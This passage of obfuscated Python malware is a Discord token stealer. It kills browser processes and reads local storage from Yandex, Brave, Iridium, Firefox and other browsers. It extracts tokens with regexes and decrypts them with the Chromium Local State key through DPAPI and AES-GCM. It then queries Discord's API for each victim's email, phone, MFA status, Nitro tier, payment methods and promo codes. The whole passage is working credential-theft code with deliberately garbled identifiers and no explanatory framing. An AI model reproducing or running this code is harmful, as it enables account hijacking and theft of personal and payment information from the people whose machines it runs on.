            ("Yandex Tech",            os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name in JLLDPKKLKAACSLNUJNCIIFKKPTMXZBJJXDLWQVERWUZRFXNCLLJRPUUUGPNQPEEMLAZXFXPUPIYVFTQPJYFXJSIQVYKCSNOSGAHZ:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name in JLLDPKKLKAACSLNUJNCIIFKKPTMXZBJJXDLWQVERWUZRFXNCLLJRPUUUGPNQPEEMLAZXFXPUPIYVFTQPJYFXJSIQVYKCSNOSGAHZ:
            if not os.path.exists(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):

                continue
            VIGBRXZCQRUNSVURBOVAFMSUKMNGUNKDJBWJXBZKPQHOOPHJFCICWZMEHQRSSCWDETOWZHPHRM = MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB.replace(" ", "").lower()
            if "cord" in LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL:
                if not os.path.exists(os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, VIGBRXZCQRUNSVURBOVAFMSUKMNGUNKDJBWJXBZKPQHOOPHJFCICWZMEHQRSSCWDETOWZHPHRM, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX = os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_file_name)
                    if os.path.exists(EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX):
                        with open(EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(AHAKFLYDZHCNOOGIEOLBXUJWYTZLUXUFDKMZDBZIWNDILCQZUJBK_enc, v4r_line.strip()):
                                    HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL = VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVAVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), FHVXIUGRBFTKKHTHTUZBDASSOEJUAOMSNVSWOIRYSOWUWXRJUSPOIDPWAGYMZPQCIGOARRNFMYKGAFZCX(os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, VIGBRXZCQRUNSVURBOVAFMSUKMNGUNKDJBWJXBZKPQHOOPHJFCICWZMEHQRSSCWDETOWZHPHRM, 'Local State')))
                                    if VPPRYMEIMLRUZKLWPUGPPTGOETREVLYLFSXQBNMFZSCZNPBRCJMOLNJLPTRGOUPS(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL, ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI):
                                        YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB = requests.get(ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI, headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL}).json()['id']
                                        if YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB not in KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ:
                                            NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN.append(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL)
                                            KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ.append(YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB)
                                            JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB[HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL] = (MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX)
            else:
                for v4r_file_name in os.listdir(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX = os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_file_name)
                    if os.path.exists(EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX):
                        with open(EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL in re.findall(AHAKFLYDZHCNOOGIEOLBXUJWYTZLUXUFDKMZDBZIWNDILCQZUJBK, v4r_line.strip()):
                                    if VPPRYMEIMLRUZKLWPUGPPTGOETREVLYLFSXQBNMFZSCZNPBRCJMOLNJLPTRGOUPS(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL, ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI):
                                        YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB = requests.get(ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI, headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL}).json()['id']
                                        if YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB not in KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ:
                                            NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN.append(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL)
                                            KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ.append(YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB)
                                            JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB[HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL] = (MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, EMJAWPZYZAXNAFHEUNXMFNTQCLKSICVSXGKANVLHISZLLESYVQNDDSGFURUKVAWTMTJTBLOUAPHMVKSDZLSFQCX)

        if os.path.exists(os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Mozilla", "Firefox", "Profiles")):
            for LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, _, v4r_files in os.walk(os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL in re.findall(AHAKFLYDZHCNOOGIEOLBXUJWYTZLUXUFDKMZDBZIWNDILCQZUJBK, v4r_line.strip()):
                                    if VPPRYMEIMLRUZKLWPUGPPTGOETREVLYLFSXQBNMFZSCZNPBRCJMOLNJLPTRGOUPS(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL, ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI):
                                        YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB = requests.get(ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI, headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL}).json()['id']
                                        if YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB not in KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ:
                                            NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN.append(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL)
                                            KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ.append(YBEHMIWPPJSUMKTIRATLYALIHSTENDRVNMBRRNVYKTEMNLJMBUORXVHYULERWHECHKNGFIMB)
                                            JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB[HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL] = ('Firefox', os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r__file))
        return NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN, JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB

    def VPPRYMEIMLRUZKLWPUGPPTGOETREVLYLFSXQBNMFZSCZNPBRCJMOLNJLPTRGOUPS(HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL, ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI):
        return requests.get(ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI, headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL}).status_code == 200

    def VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVAVal(PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG):
        PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS = PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME[3:15]
        BIYKSABYZPXXBZBMOLCKFBZHQJPLFAXHLRPLJDDITOFDPLLCQTUTSMHHNFORVXMECBKBGHCNAGSBZKXZUELODAVLXZMPKR = PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME[15:]
        FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO = AES.new(SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG, AES.MODE_GCM, PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS)
        return FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO.decrypt(BIYKSABYZPXXBZBMOLCKFBZHQJPLFAXHLRPLJDDITOFDPLLCQTUTSMHHNFORVXMECBKBGHCNAGSBZKXZUELODAVLXZMPKR)[:-16].decode()

    def FHVXIUGRBFTKKHTHTUZBDASSOEJUAOMSNVSWOIRYSOWUWXRJUSPOIDPWAGYMZPQCIGOARRNFMYKGAFZCX(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
        if not os.path.exists(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
            return None
        with open(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, "r", encoding="utf-8") as v4r_f:
            LRONNZMHJRUUYOSLXMBUYZEUVAIFLMSNOFKKEJUCYLYOPSESIZZJAFQLASUQQWONNXE = json.load(v4r_f)
        SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG = base64.b64decode(LRONNZMHJRUUYOSLXMBUYZEUVAIFLMSNOFKKEJUCYLYOPSESIZZJAFQLASUQQWONNXE["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG, None, None, None, 0)[1]

    NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN, JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB = WVFXFIKASWCFHNXHRCZLVZLMASGIJELORISEGWIJFOKJCJGZYREYWXQOETSEUYDOWYO()
    
    if not NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN:
        PTECCOECWYCJHQKHCZTRDDZRENNQCFZJSVPIBWGLMWAGOLHRWIOYMKGRSYKOINAQMLXFGCYYLDIXEJR = "No discord tokens found."

    for HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd in NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN:
        CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ += 1

        try: DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd}).json()
        except: DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = {"None": "None"}

        QJHFNINZNEFQTRETERGJXYADCHGOXEKWMEGCNPQBJFYQQYXSXNVYYOYRNWDOGRMRGHEQUETAZKLLPMVMXRGLGBPU = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('username', "None") + '#' + DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('discriminator', "None")
        ZBHRWVRKHEXUZNORFFCHNVLPDOOLIFXYOCIIXWCUQORVVSFMWJXJBSCDS = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('global_name', "None")
        EDMXOLKTRQJAERSBFBLGOMAVQIDYZVWWGZSHSYSCUIRDQZAVODTETJUIVZATTQHBRZXEXVIGOXQIXGSVUTGKENRUBQTJGEORQPUZ = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('id', "None")
        XRIEQKTZEEZEZQKWMKQQUWYZRHNBDOCXXIIJKYXYRHUESTFIPFFHZSPGVLPBXLK = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('email', "None")
        JGFKIEGDLFSIBACQXFMCMHGUVFHKJQJHSATEKUBGUVOAXDNOMCBVTZOATORPJAREEUAZJOINBTH = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('verified', "None")
        JQGIBUCGBJEEUHPQLMJZWHYFKTALDZUPOSVCEUGJTGRISZHEVMWDBJR = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('phone', "None")
        HHNGQGZGQRIEDVKLYIFPRXYNGHEGKHYNFGOUTQLCTPOKTPMCKVB = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('locale', "None")
        VGEKQNNNPVHQBXJNZFAOZXBAEPUBPNQOWIQBXAMXFAANOSQPAQZASWGDVHGLIEINXRNGPNNGGTVDAEQIQMQJTWKZRP = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('mfa_enabled', "None")

        try:
            if DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('premium_type', 'None') == 0:
                XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = 'False'
            elif DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('premium_type', 'None') == 1:
                XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = 'Nitro Classic'
            elif DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('premium_type', 'None') == 2:
                XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = 'Nitro Boosts'
            elif DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('premium_type', 'None') == 3:
                XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = 'Nitro Basic'
            else:
                XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = 'False'
        except:
            XJOMEJAMAOQIESRBVYVGJIOLUWXABANCNOIHQGOBOYDDRQRKUBJCMSGQWRARMKOPUIEJLAQPTWXFVTDODIVKEPIDEQ = "None"

        try: RDFOLIBQTZOURSAMJRAEMFCSPWKBIHURFRFIMZODBFOSUDXSUZXAKYZMCYONUFHEOV = f"https://cdn.discordapp.com/avatars/{EDMXOLKTRQJAERSBFBLGOMAVQIDYZVWWGZSHSYSCUIRDQZAVODTETJUIVZATTQHBRZXEXVIGOXQIXGSVUTGKENRUBQTJGEORQPUZ}/{DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{EDMXOLKTRQJAERSBFBLGOMAVQIDYZVWWGZSHSYSCUIRDQZAVODTETJUIVZATTQHBRZXEXVIGOXQIXGSVUTGKENRUBQTJGEORQPUZ}/{DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{EDMXOLKTRQJAERSBFBLGOMAVQIDYZVWWGZSHSYSCUIRDQZAVODTETJUIVZATTQHBRZXEXVIGOXQIXGSVUTGKENRUBQTJGEORQPUZ}/{DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY['avatar']}.png"
        except: RDFOLIBQTZOURSAMJRAEMFCSPWKBIHURFRFIMZODBFOSUDXSUZXAKYZMCYONUFHEOV = "None"

        try:
            MSCZOCSDAUQSPEKZEWTEUBKEASSHBFCPWSTNSUYVLGXUWZHSHNQWUFJQCQOUIEACUXOBMRJFQZMDTJGUXFBKXV = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd}).json()
            if MSCZOCSDAUQSPEKZEWTEUBKEASSHBFCPWSTNSUYVLGXUWZHSHNQWUFJQCQOUIEACUXOBMRJFQZMDTJGUXFBKXV:
                MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX = []

                for v4r_method in MSCZOCSDAUQSPEKZEWTEUBKEASSHBFCPWSTNSUYVLGXUWZHSHNQWUFJQCQOUIEACUXOBMRJFQZMDTJGUXFBKXV:
                    if v4r_method['type'] == 1:
                        MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX.append("Paypal")
                    else:
                        MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX.append('Other')
                MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX = ' / '.join(MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX)
            else:
                MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX = "None"
        except:
            MOJSAUWVXBQSGQQSGSALGLJVKNUAUWHWBNOTOUTNMJXAUWFWYWSNRPOXEXQQUMEARNRMFMMTPETIZBFHIUOSRX = "None"

        try:
            LKEFOZYZWSGKCQWOENDMWIGDBYECZNJMUBPKRCYNJBDPTCZJYZWUIEKUABUSJ = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': HZPTHLQLZOILMVSSLCVFORFKKLDEBECARBSVVEHPKSOVLENSLGCOWIJRJGBGYBIRERJEMOLVL_d15c0rd}).json()
            if LKEFOZYZWSGKCQWOENDMWIGDBYECZNJMUBPKRCYNJBDPTCZJYZWUIEKUABUSJ:
                EXLHWWDNJJFXTBCLCNBIWICFKAESUOHGYOBTTHSRPYHDPWHFBCWZVEVLAODMAD = []
                for NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ in LKEFOZYZWSGKCQWOENDMWIGDBYECZNJMUBPKRCYNJBDPTCZJYZWUIEKUABUSJ:
                    MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB = NWALHGLKAWPMUFUUSHVWWDWFWROSOJWTUXXYKWLHQDYNSBDSDVKQ['promotion']['outbound_title']
